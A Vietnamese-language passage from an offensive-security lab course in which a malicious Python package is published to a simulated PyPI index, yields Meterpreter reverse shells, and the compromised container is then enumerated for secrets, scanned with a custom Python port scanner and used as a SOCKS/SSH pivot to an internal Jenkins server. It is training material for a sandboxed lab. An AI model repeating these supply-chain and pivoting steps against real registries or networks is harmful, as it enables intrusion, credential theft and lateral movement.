Bây giờ khi listener đã sẵn sàng, hãy kiểm tra package của chúng ta để đảm bảo nó hoạt động trước khi phát hành. Hãy quay lại Kali instance cá nhân của chúng ta và gỡ cài đặt, build lại, và cài đặt lại package hackshort-util. Cuối cùng, chúng ta sẽ khởi động Python và import utils từ hackshort_util.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
...

kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...

kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
...

kali@kali:~/hackshort-util$ python3
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hackshort_util import utils
>>>
```

               *Listing 72 - Gỡ Cài Đặt, Build Lại, Cài Đặt Lại, và Import hackshort-util Package*

Tiếp theo, chúng ta sẽ quay lại cloud Kali instance nơi listener đang chạy và kiểm tra xem chúng ta có nhận được reverse shell từ việc load module hay không.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 233.252.50.125
[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
```

                                                              *Listing 73 - Bắt Reverse Shell*

Chúng ta thấy rằng việc import package đã gửi về một reverse shell! Hãy thử tương tác với session bằng cách sử dụng lệnh sessions và tùy chọn -i với ID của session (1). Chúng ta sẽ thoát khỏi session này sau khi tương tác, vì chúng ta không cần nó và không muốn nhầm lẫn với các session thực tế.

```
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 233.252.50.125 - Meterpreter session 1 closed.  Reason: Died
```

                                                     *Listing 74 - Đóng Meterpreter Session*

Điều duy nhất còn lại là phát hành package của chúng ta và hy vọng rằng chúng ta sẽ nhận được một vài reverse shell.

---

## 9.6. Phát hành Gói tin Độc Hại của Chúng ta

---

Trong môi trường thực tế, chúng ta sẽ tạo một tài khoản trên Python Package Index công khai và upload package của mình lên đó. Tuy nhiên, chúng ta không muốn spam repository công khai này bằng các package độc hại. Thay vào đó, chúng ta sẽ nhắm tới index pypi.offseclab.io, được thiết kế để mô phỏng repository công khai chính thức. Thay vì tạo một tài khoản mới, chúng ta sẽ sử dụng tài khoản có sẵn với username là **student** và password là **password**. Để sử dụng package server này cho việc upload, chúng ta cần chỉ định URL server và thông tin đăng nhập trong file `~/.pypirc`.

```
kali@kali:~/hackshort-util$ nano ~/.pypirc

kali@kali:~/hackshort-util$ cat ~/.pypirc
[distutils]
index-servers = 
    offseclab 

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password                     
```

             *Listing 75 - Cấu Hình File ~/.pypirc để Thêm URL Server và Thông Tin Đăng Nhập*

Trong section đầu tiên (distutils), chúng ta chỉ định danh sách các server. Trong trường hợp này, chúng ta chỉ có một server tên là offseclab. Bên dưới, chúng ta cần chỉ định cấu hình cho index server này. Chúng ta sẽ thiết lập URL của repository bằng biến repository. Chúng ta cũng chỉ định username và password.

Bây giờ, chúng ta có thể build package và upload nó. Để làm điều này, chúng ta cần thêm lệnh upload vào lệnh build mà chúng ta đã sử dụng. Chúng ta cũng cần chỉ định rằng chúng ta muốn sử dụng repository offseclab với tùy chọn -r.

```
kali@kali:~/hackshort-util$ python3 setup.py sdist upload -r offseclab              
...
Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
Server response (200): OK
```

                 *Listing 76 - Upload Gói Tin Độc Hại Của Chúng Ta Lên offseclab Repository*

Nếu một package không mong muốn đã được upload và chúng ta cần gỡ bỏ nó, chúng ta có thể chạy lệnh sau:

```
curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/
```

Lệnh này sẽ rebuild package và upload nó lên server. Trong output, chúng ta sẽ thấy log cho biết package đang được gửi tới server pypi.offseclab.io và phản hồi trả về là mã 200.

Bây giờ, chúng ta chỉ cần chờ reverse shell.

Web server production được cấu hình để rebuild mỗi 10 phút. Nếu bạn không nhận được shell trong vòng 10 phút, thì đã có điều gì đó xảy ra sai.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 44.211.221.172
[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
```

*Listing 77 - Thu Được Reverse Shell Sau Khi Phát Hành Gói Tin Độc Hại Lên PyPI Server pypi.offseclab.io*

Tuyệt vời! Chúng ta đã đạt được thực thi lệnh.

---

# 10. Xâm Nhập Môi Trường

---

Bây giờ khi chúng ta đã có thực thi mã, chúng ta cần pivot và cố gắng giành được thêm quyền truy cập. Điều này có thể được thực hiện theo nhiều cách. Chúng ta có thể tìm các bí mật trong filesystem của nạn nhân, chúng ta có thể pivot sang các dịch vụ hoặc ứng dụng khác, hoặc chúng ta có thể leo thang đặc quyền lên một tài khoản người dùng cấp cao hơn và bắt đầu lại quy trình.

Dù chúng ta chọn con đường nào, trước tiên chúng ta phải liệt kê (enumerate) quyền truy cập mà chúng ta đã giành được. Việc này sẽ cung cấp cho chúng ta thêm thông tin về môi trường mục tiêu.

Learning Unit này bao gồm các Learning Objective sau:

- Xây dựng sự hiểu biết sâu hơn về môi trường mục tiêu
- Hiểu các dịch vụ khác trên mạng
- Khai thác các dịch vụ khác thông qua điểm truy cập ban đầu của chúng ta
- Leo thang lên tài khoản administrator trong nhà cung cấp cloud

---

## **10.1. Enumerating the Production Container**

---

Hãy bắt đầu quá trình liệt kê bằng cách tương tác với session mà chúng ta vừa thu được. Trước tiên, chúng ta sẽ liệt kê tất cả các session hiện có. Sau đó, chúng ta có thể tương tác với session bằng cách chạy `sessions -i 2`.

```
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...
```

                                                          *Listing 78 - Tương Tác với Session Mới*

Khi liệt kê các session đang hoạt động, chúng ta nhận thấy hostname là “6699d104d6c5” (hostname này sẽ khác nhau ở mỗi lab). Chúng ta cũng nhận thấy rằng mình đang chạy với quyền người dùng root.

Khi tương tác với session, chúng ta sẽ được đưa vào một meterpreter shell. Meterpreter có nhiều công cụ có thể hỗ trợ cho việc liệt kê. Trước tiên, chúng ta có thể sử dụng `ifconfig` để liệt kê các network interface trên mục tiêu. Điều quan trọng cần lưu ý là đây không phải là lệnh ifconfig quen thuộc trên nhiều máy Linux, mà là một công cụ của meterpreter. Điều này có nghĩa là output sẽ hơi khác.

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP LOOPBACK RUNNING
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface 41
============
Name         : eth1
Hardware MAC : 02:42:ac:1e:00:03
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.30.0.3
IPv4 Netmask : 255.255.0.0

Interface 43
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:04
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.18.0.4
IPv4 Netmask : 255.255.0.0
```

                                                    *Listing 79 - Xem Xét Các Network Interface*

Chúng ta tìm thấy hai network interface. Một interface nằm trong dải mạng 172.18.0.4/16, và interface còn lại nằm trong dải 172.30.0.0/16. Chúng ta sẽ ghi nhận lại thông tin này và tiếp tục quá trình liệt kê.

Hãy lấy quyền truy cập shell để có thể chạy trực tiếp các lệnh trên mục tiêu. Để làm điều này, chúng ta sẽ chạy `shell`. Khi đã có quyền truy cập shell, chúng ta sẽ chạy `whoami` để xác nhận rằng mình đang chạy với quyền root và `ls -alh` để liệt kê thư mục hiện tại.

```
meterpreter > shell
whoami
root

ls -alh
total 32K
drwxr-xr-x 1 root root  17 Jul  6 16:25 .
drwxr-xr-x 1 root root  40 Jul  6 16:42 ..
drwxr-xr-x 8 root root 162 Jul  6 16:41 .git
-rw-r--r-- 1 root root 199 Jul  6 16:25 Dockerfile
-rw-r--r-- 1 root root 15K Jul  6 16:25 README.md
drwxr-xr-x 1 root root  52 Jul  6 16:42 app
-rw-r--r-- 1 root root 167 Jul  6 16:25 pip.conf
-rw-r--r-- 1 root root 196 Jul  6 16:25 requirements.txt
-rw-r--r-- 1 root root 123 Jul  6 16:25 run.py
```

                                       *Listing 80 - Kiểm Tra Người Dùng và Thư Mục Hiện Tại*

Chúng ta có thể xác nhận rằng mình đang chạy với quyền người dùng root. Trong danh sách thư mục, chúng ta cũng tìm thấy một số mã Python, cũng như một thư mục app. Chúng ta cũng sẽ ghi nhận lại điều này. Việc exfiltrate source code có thể rất có lợi, vì nó có thể chứa các bí mật hoặc chúng ta có thể phát hiện ra các lỗ hổng khác trong ứng dụng.

Vì chúng ta đang chạy với quyền root và nhận thấy hostname là các ký tự chữ và số ngẫu nhiên, chúng ta có thể nghi ngờ rằng mình đã truy cập vào một container. Hãy sử dụng lệnh `mount` để liệt kê các mount. Thông thường, điều này sẽ cho chúng ta câu trả lời rõ ràng hơn về việc liệu chúng ta có đang chạy trong container hay không.

```
mount

overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/XSUOTVCMJALCFZC3RDKUMDRFT7:/var/lib/docker/overlay2/l/GZ2WZHEOX36F3NXSO3JL4BYD6L:/var/lib/docker/overlay2/l/HVQUSP32SJWVAJ3KOL2QASE4W3:/var/lib/docker/overlay2/l/HE7JGACHWIPRNCT54LBN6AXOZP:/var/lib/docker/overlay2/l/ESRP43XML3BVETNT2Z7I3N2JU4:/var/lib/docker/overlay2/l/KP435SVPCD3NIUYPJPVAREWOOZ:/var/lib/docker/overlay2/l/72FQOR2NP3DWJJSQEXIRCSYJLG:/var/lib/docker/overlay2/l/XGHOLK75NEJNWWWX6CXQOTPRVX:/var/lib/docker/overlay2/l/FYRGADRJGMIS5XK5SBKPLCX6BG:/var/lib/docker/overlay2/l/Z2X5KHFJNPU35ZKBGAHJUEZT3I:/var/lib/docker/overlay2/l/5QTAPW6XADCCWCTAVASPNQT7A4:/var/lib/docker/overlay2/l/35PKZCCO3U4ARBXXGICO35VEMU:/var/lib/docker/overlay2/l/J5J2DCSN4XC4G5HJ6VLPEB3KJL:/var/lib/docker/overlay2/l/D3NHOQ5FM57FMMCEBAT575CAVI:/var/lib/docker/overlay2/l/4BJ4Q3NJFA6VRGPHR4GYYFAB4T,upperdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/diff,workdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
...
```

                                                             *Listing 81 - Xem Xét Các Mount*

Dựa trên output, chúng ta nhận thấy rằng shell của mình đang nằm trong một Docker container. Điều này làm thay đổi một chút chiến thuật liệt kê của chúng ta. Để bắt đầu, việc kiểm tra các biến môi trường (environment variables) được nâng mức ưu tiên. Các biến môi trường thường được sử dụng để cấu hình ứng dụng với các bí mật mà chúng ta thường không muốn đặt trong source code. Chúng ta sẽ chạy `printenv` để liệt kê tất cả các biến môi trường.

```
printenv

HOSTNAME=6699d104d6c5
SECRET_KEY=asdfasdfasdfasdf
PYTHON_PIP_VERSION=22.3.1
HOME=/root
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
ADMIN_PASSWORD=password
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
SQLALCHEMY_TRACK_MODIFICATIONS=False
PYTHON_VERSION=3.11.2
PYTHON_SETUPTOOLS_VERSION=65.5.1
PWD=/app
PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
ADMIN_USERNAME=admin
```

                                                  *Listing 82 - Xem Xét Các Biến Môi Trường*

Trong output này, chúng ta tìm thấy một số bí mật: ADMIN_USERNAME và ADMIN_PASSWORD, SECRET_KEY, và GPG_KEY. Hiện tại chúng ta chưa biết các giá trị này có thể được sử dụng vào việc gì, nhưng chúng ta sẽ ghi nhận lại chúng trước.

Điều quan trọng cần lưu ý là session hiện tại của chúng ta có thể bị chết trong quá trình liệt kê hoặc trong bất kỳ giai đoạn nào khác. Điều này là do service thường xuyên được khởi động lại. Tuy nhiên, khi service khởi động lại, một meterpreter session mới sẽ được tạo ngay lập tức. Chúng ta chỉ cần chuyển sang session đó bằng cách chạy `sessions -i` kèm theo ID của session.

```
[*] 172.18.0.4 - Meterpreter session 2 closed.  Reason: Died

[*] Sending stage (24772 bytes) to 198.18.53.73

[*] Meterpreter session 3 opened (10.0.1.54:4488 -> 198.18.53.73:60146)

msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter >
```

                                          *Listing 83 - Đóng và Mở Lại Các Meterpreter Session*

Trong môi trường thực tế, quá trình liệt kê sẽ tiếp tục trên container này. Chúng ta vẫn còn phải khám phá source code mà mình đã phát hiện, cơ sở dữ liệu của ứng dụng, và nhiều thứ khác. Tuy nhiên, chúng ta sẽ để các phần này như những bài tập độc lập và thay vào đó chuyển sang việc quét mạng để tìm các dịch vụ khác.

---

## 10.2. Quét Mạng

---

Việc giành được quyền truy cập vào container này đã mở ra cho chúng ta một thế giới thông tin mới để nhắm tới. Như đã thấy trong phần liệt kê mạng, chúng ta đã phát hiện nhiều interface trên container này. Điều này đặc biệt thú vị đối với chúng ta, vì việc thêm một interface có nghĩa là rất có thể có thứ gì đó ở đầu bên kia để chúng ta khám phá. Bảo mật thường lỏng lẻo với các dịch vụ khả dụng trên các mạng riêng này, vì các tổ chức tin rằng mạng riêng là “riêng” hoặc việc xác thực sẽ được xử lý bởi một reverse proxy. Vì vậy, nếu chúng ta có quyền truy cập trực tiếp vào dịch vụ, chúng ta thường có thể vượt qua bất kỳ lớp bảo mật bổ sung nào.

Nmap sẽ là một công cụ tuyệt vời để sử dụng. Tuy nhiên, nó sẽ cần được cài đặt trên mục tiêu, hoặc chúng ta sẽ phải tự cài đặt nó. Vì đây là một container, Nmap rất có khả năng không được cài đặt, và việc cài đặt thêm package có thể khó khăn hoặc không mong muốn vì yếu tố stealth.

Chúng ta có thể tunnel các lượt quét nmap thông qua meterpreter shell; tuy nhiên, các lượt quét đó thường chậm và cho ra thông tin không chính xác.

Lý tưởng nhất, chúng ta sẽ tiến hành quét từ container nạn nhân bằng cách tận dụng những gì chúng ta đã có quyền truy cập. Chúng ta biết container này có Python, vì Python đã được dùng để lấy shell. Hãy tạo một script Python ngắn để quét một mạng cho trước. Chúng ta sẽ tạo script này trên Kali instance cá nhân của mình thay vì cloud instance.

```
kali@kali:~$ nano netscan.py

kali@kali:~$ cat -n netscan.py
01  import socket
02  import ipaddress
03  import sys
04
05  def port_scan(ip_range, ports):
06      for ip in ip_range:
07          print(f"Scanning {ip}")
08          for port in ports:
09              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
10              sock.settimeout(.2)
11              result = sock.connect_ex((str(ip), port))
12              if result == 0:
13                  print(f"Port {port} is open on {ip}")
14              sock.close()
15
16  ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
17  ports = [80, 443, 8080]  # List of ports to scan
18
19  port_scan(ip_range, ports)
```

                                                *Listing 84 - Tạo Script Python Để Quét Cổng*

Trong ba dòng đầu tiên, chúng ta sẽ import các thư viện cần thiết. Thư viện socket sẽ được dùng để tạo một kết nối tới một cổng để kiểm tra xem nó có mở hay không. Thư viện ipaddress sẽ được dùng để phân tích (parse) địa chỉ IP dòng lệnh. Cuối cùng, thư viện sys sẽ được dùng để truy cập các đối số dòng lệnh. Cả ba thư viện này thường có sẵn theo mặc định trong môi trường Python.

Tiếp theo, ở các dòng 5-14, chúng ta định nghĩa hàm để quét cổng. Hàm này sẽ nhận một dải IP và một danh sách cổng làm đối số. Ở dòng 6, chúng ta bắt đầu một vòng lặp for cho từng IP trong dải. Với mỗi IP, chúng ta tạo một vòng lặp for khác cho từng cổng ở dòng 8. Dòng 9 sẽ khởi tạo một socket, dòng 10 đặt timeout là 0.2 giây (vì chúng ta đang quét mạng nội bộ, timeout có thể tương đối ngắn), và ở dòng 11, chúng ta sẽ thực hiện kết nối. Ở các dòng 12 và 13, chúng ta kiểm tra xem kết nối có thành công hay không và báo cáo nếu có. Ở dòng 14, chúng ta đóng socket.

Sau phần định nghĩa hàm, chúng ta sẽ parse đối số đầu tiên (dải địa chỉ IP), lưu nó vào một biến tên là ip_range. Ở dòng 17, chúng ta định nghĩa một vài cổng. Chúng ta sẽ bắt đầu bằng cách tìm các dịch vụ web trên các cổng web phổ biến: 80, 443, và 8080. Chúng ta có thể mở rộng danh sách này, nhưng mỗi cổng bổ sung sẽ làm tăng đáng kể thời gian quét.

Cuối cùng, ở dòng 19, chúng ta gọi hàm với các đối số của mình. Script này có thể được làm cho hiệu quả hơn; tuy nhiên, như vậy là đủ cho nhu cầu của chúng ta.

Khi đã tạo script xong, chúng ta sẽ dùng scp để copy `netscan.py` sang cloud Kali instance của mình dưới `/home/kali/`.

```
kali@kali:~$ scp ./netscan.py kali@34.203.75.99:/home/kali/
kali@34.203.75.99's password: 
netscan.py   
```

                                     *Listing 85 - Chuyển Script netscan.py Sang Cloud Kali Instance*

Bây giờ khi chúng ta đã có script trên cloud Kali instance, chúng ta sẽ dùng meterpreter để chuyển nó sang nạn nhân. Chúng ta có thể tận dụng lệnh upload để chuyển `/home/kali/netscan.py` tới thư mục `root` trong container.

```
meterpreter > upload /home/kali/netscan.py /netscan.py
[*] Uploading  : /home/kali/netscan.py -> /netscan.py
[*] Uploaded 559.00 B of 559.00 B (100.0%): /home/kali/netscan.py -> /netscan.py
[*] Completed  : /home/kali/netscan.py -> /netscan.py
```

                                   *Listing 86 - Upload Script netscan.py Của Chúng Ta Lên Mục Tiêu*

Hãy tự nhắc lại các dải mạng mà chúng ta đang nhắm tới bằng cách chạy lại ifconfig.

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP LOOPBACK RUNNING
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface 65
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:04
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.18.0.4
IPv4 Netmask : 255.255.0.0

Interface 67
============
Name         : eth1
Hardware MAC : 02:42:ac:1e:00:03
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.30.0.3
IPv4 Netmask : 255.255.0.0
```

                                            *Listing 87 - Các Network Interface Trên Mục Tiêu*

Chúng ta tìm thấy các mạng 172.18.0.1/16 và 172.30.0.1/16 trên mục tiêu. Quét ba cổng trên một mạng /16 sẽ gửi hơn 190,000 request. Điều này sẽ mất rất lâu nếu dùng script của chúng ta. Thay vào đó, hãy quét một mạng /24 để tiết kiệm thời gian và nếu cần, chúng ta có thể tối ưu script để quét /16.

Chúng ta sẽ dùng lệnh shell trong meterpreter để mở một interactive shell. Sau đó, chúng ta sẽ dùng python để chạy `/netscan.py` và cung cấp cho nó mạng `172.18.0.1/24`.

```
meterpreter > shell
Process 17 created.
Channel 4 created.

python /netscan.py 172.18.0.1/24
Scanning 172.18.0.0
Scanning 172.18.0.1
Port 80 is open on 172.18.0.1
Scanning 172.18.0.2
Port 80 is open on 172.18.0.2
Scanning 172.18.0.3
Port 80 is open on 172.18.0.3
Scanning 172.18.0.4
Scanning 172.18.0.5
Port 80 is open on 172.18.0.5
Scanning 172.18.0.6
...
```

                                                      *Listing 88 - Quét Cổng Trên 172.18.0.1/24*

Khi bạn chạy `netscan.py`, có thể bạn sẽ thấy shell như bị “đơ”. Đây là điều bình thường trong khi script đang chạy. Hãy cho nó vài phút, sau đó shell sẽ phản hồi trở lại và hiển thị output của lượt quét.

Từ kết quả tìm kiếm này, chúng ta tìm thấy bốn dịch vụ chạy trên cổng 80. Địa chỉ 172.18.0.1 rất có khả năng là gateway, trỏ tới các cổng được expose từ host trong một số môi trường container hóa. Đây rất có khả năng là cùng cổng mà chúng ta có thể truy cập từ Internet. Hãy dùng curl để xác nhận điều này bằng cách gửi một HTTP request. Chúng ta cũng sẽ gửi một request tới 172.18.0.2 để cố gắng khám phá các dịch vụ này có thể là gì.

```
curl -vv 172.18.0.1
...
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Caddy
< Content-Length: 0
...

curl -vv 172.18.0.2
...
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Caddy
< Content-Length: 0
...
```

                                              *Listing 89 - Dùng Curl Để Fingerprint Dịch Vụ*

Dịch vụ tại 172.18.0.1 phản hồi với header Caddy, thứ mà chúng ta cũng đã phát hiện trong quá trình liệt kê ban đầu. Dịch vụ tại 172.18.0.2 cũng phản hồi với cùng header này. Dựa trên thông tin này, chúng ta có thể giả định rằng 172.18.0.1 rất có khả năng là cổng trên host dùng để expose dịch vụ Caddy tại 172.18.0.2.

Trong môi trường thực tế, chúng ta sẽ dành nhiều thời gian hơn để liệt kê phần còn lại của các dịch vụ mà chúng ta đã phát hiện. Tuy nhiên, chúng ta sẽ để phần này như một bài tập và tiếp tục quét mạng 172.30.0.1/24.

```
python /netscan.py 172.30.0.1/24

Scanning 172.30.0.0
Scanning 172.30.0.1
Port 80 is open on 172.30.0.1
Scanning 172.30.0.2
...
Scanning 172.30.0.10
Port 80 is open on 172.30.0.10
Scanning 172.30.0.11
...
Scanning 172.30.0.30
Port 8080 is open on 172.30.0.30
Scanning 172.30.0.31
...
Scanning 172.30.0.50
Port 8080 is open on 172.30.0.50
Scanning 172.30.0.51
...
Scanning 172.30.0.60
Port 8080 is open on 172.30.0.60
Scanning 172.30.0.61
...
```

                                                   *Listing 90 - Quét Cổng Trên 172.30.0.1/24*

Một lần nữa, chúng ta lại tìm thấy nhiều dịch vụ. Một lần nữa, IP 172.30.0.1 rất có khả năng là host. 172.30.0.10 là một Caddy reverse proxy khác. Tuy nhiên, IP 172.30.0.30 là thứ khiến chúng ta quan tâm. Hãy kiểm tra xem chúng ta nhận được gì khi gửi một HTTP Request tới nó trên cổng 8080 (cổng đã được phát hiện).

```
curl 172.30.0.30:8080/
...
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>

...

curl 172.30.0.30:8080/login
...
<!DOCTYPE html><html lang="en"><head resURL="/static/dd8fdc36" data-rooturl="" data-resurl="/static/dd8fdc36" data-imagesurl="/static/dd8fdc36/images"><title>Sign in [Jenkins]</title><meta name="ROBOTS" content="NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="/static/dd8fdc36/jsbundles/simple-page.css" type="text/css"></head><body><div class="simple-page" role="main"><div class="modal login"><div id="loginIntroDefault"><div class="logo"><img src="/static/dd8fdc36/images/svgs/logo.svg" alt="Jenkins logo"></div><h1>Welcome to Jenkins!</h1></div><form method="post" name="login" action="j_spring_security_check"><p class="signupTag simple-page--description">Please sign in below or <a href="signup">create an account</a>.<div class="jenkins-form-item jenkins-form-item--tight"><input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" autofocus="autofocus" class="jenkins-input normal" autocapitalize="off" aria-label="Username"></div><div class="jenkins-form-item jenkins-form-item--tight"><input name="j_password" placeholder="Password" type="password" class="jenkins-input normal" aria-label="Password"></div><div class="jenkins-checkbox jenkins-form-item jenkins-form-item--tight jenkins-!-margin-bottom-3"><input type="checkbox" id="remember_me" name="remember_me"><label for="remember_me">Keep me signed in</label></div><input name="from" type="hidden"><div class="submit"><button type="submit" name="Submit" class="jenkins-button jenkins-button--primary">Sign in</button></div></form><div class="footer"></div></div></div></body></html>
```

                      *Listing 91 - Phát Hiện Dịch Vụ Jenkins Khi Chạy curl Tới Các Endpoint Cụ Thể*

Request đầu tiên mà chúng ta gửi nhận được phản hồi chuyển hướng tới trang /login. Bằng cách gửi request tới /login, chúng ta thấy đây là một Jenkins server.

Mặc dù Jenkins server này yêu cầu đăng nhập (dựa trên việc chuyển hướng), nó cũng cung cấp tùy chọn tạo tài khoản. Nếu Jenkins đã vô hiệu hóa self-registration, tùy chọn này sẽ không được hiển thị.

Jenkins là một mục tiêu rất hấp dẫn. Nó thường chứa các bí mật và quyền truy cập tới các môi trường khác. Việc đăng ký mở trên Jenkins khiến khả năng khai thác tiếp theo cao hơn rất nhiều.

Hãy thử tạo một tài khoản trên Jenkins - nhưng trước tiên, chúng ta cần tìm cách truy cập Jenkins từ Kali instance của mình.

---

## 10.3. Tải Jenkins

---

Mặc dù có thể tiếp tục liệt kê chỉ bằng cách sử dụng curl và tự xử lý request thủ công, nhưng việc này có thể trở nên tẻ nhạt. Thay vào đó, bây giờ khi chúng ta đã có một mục tiêu, chúng ta sẽ tạo một tunnel cho phép Kali instance cá nhân của chúng ta gửi request thông qua cloud instance, rồi tiếp tục thông qua reverse shell tới mục tiêu Jenkins.

![image.png](image%2023.png)

                                                                    *Figure 24: Sơ đồ Tunneling*

Chúng ta sẽ sử dụng một SOCKS proxy trên cloud Kali instance. Cổng proxy sẽ được expose tới Kali instance cá nhân của chúng ta thông qua một SSH tunnel. Chúng ta cũng sẽ tạo một route để đảm bảo rằng các request có đích tới subnet 172.30.0.1/16, nơi Jenkins đang chạy, sẽ đi qua shell.

Trước khi có thể khởi động SOCKS proxy, chúng ta cần quay về menu chính của Metasploit. Để làm điều đó, chúng ta sẽ phải thoát khỏi shell và đưa session hiện tại xuống background. Điều quan trọng là chúng ta chỉ chạy exit nếu chúng ta đang ở trong một shell đang hoạt động. Nếu không, chúng ta sẽ thoát khỏi Metasploit.

```
exit
[-] core_channel_interact: Operation failed: Unknown error

meterpreter > background
[*] Backgrounding session 1...
```

                             *Listing 92 - Thoát Shell và Đưa Session Xuống Background*

Tiếp theo, chúng ta sẽ khởi động SOCKS proxy trong meterpreter. Chúng ta sẽ dùng module `auxiliary/server/socks_proxy`. Chúng ta không muốn SOCKS proxy bị lộ ra Internet, nên chúng ta sẽ đổi SRVHOST từ giá trị mặc định (tất cả interface) sang chỉ lắng nghe trên 127.0.0.1. Cuối cùng, chúng ta sẽ chạy module như một job (-j).

```
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
```

                                       *Listing 93 - Dùng Module SOCKS Proxy và Chạy Nó*

SOCKS proxy bây giờ sẽ khởi động trên localhost cổng 1080 theo mặc định.

Bây giờ khi SOCKS proxy đang chạy, hãy thêm một route để mọi kết nối được thực hiện thông qua SOCKS proxy sẽ đi qua shell. Trước tiên, chúng ta sẽ liệt kê tất cả các session đang hoạt động bằng cách chạy sessions. Từ đó, chúng ta sẽ lấy được ID của session. Tiếp theo, chúng ta sẽ chạy route với lệnh add. Chúng ta sẽ chỉ định mạng mà chúng ta đang nhắm tới với IP Jenkins server (172.30.0.1) và network mask của nó (255.255.0.0). Cuối cùng, chúng ta sẽ cung cấp cho lệnh này session ID (2, trong trường hợp của chúng ta).

```
msf6 exploit(server/socks_proxy) > sessions

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)

msf6 auxiliary(server/socks_proxy) > route add 172.30.0.1 255.255.0.0 2
```

                                                                  *Listing 94 - Tạo Route*

Tại thời điểm này, chúng ta đã có SOCKS proxy và route đã được thêm. Tuy nhiên, chúng ta chưa có SSH tunnel để làm SOCKS proxy khả dụng trên Kali instance cá nhân của chúng ta.

![image.png](image%2024.png)

                                        *Figure 25: Sơ đồ Tunneling Khi Chưa Có SSH Tunnel*

Hãy tạo một local forwarding SSH tunnel tới cloud Kali instance từ instance cá nhân của chúng ta. Việc này sẽ mở một cổng trên instance cá nhân, và mọi traffic mạng gửi tới cổng đó sẽ tự động được forward tới cổng đã chỉ định trên cloud instance thông qua tunnel.

Để tạo local forward, chúng ta sẽ dùng tùy chọn -L. Sau đó, chúng ta sẽ chỉ định interface và cổng mà chúng ta muốn mở trên Kali instance cá nhân (localhost:1080). Tiếp theo, chúng ta sẽ nối thêm cổng mà chúng ta muốn forward traffic tới. Vì SOCKS proxy được mở trên localhost:1080, chúng ta có thể dùng cổng đó.

Chúng ta cũng muốn phiên làm việc này chỉ mở tunnel, vì vậy chúng ta sẽ yêu cầu SSH không thực thi lệnh nào bằng tùy chọn -N và yêu cầu SSH chạy dưới nền bằng -f. Cuối cùng, chúng ta sẽ chỉ định thông tin đăng nhập cho Kali instance của mình.

```
kali@kali:~$ ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
kali@192.88.99.76's password:

kali@kali:~$ ss -tulpn
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process                          
tcp    LISTEN  0       128          127.0.0.1:1080        0.0.0.0:*     users:(("ssh",pid=75991,fd=5))  
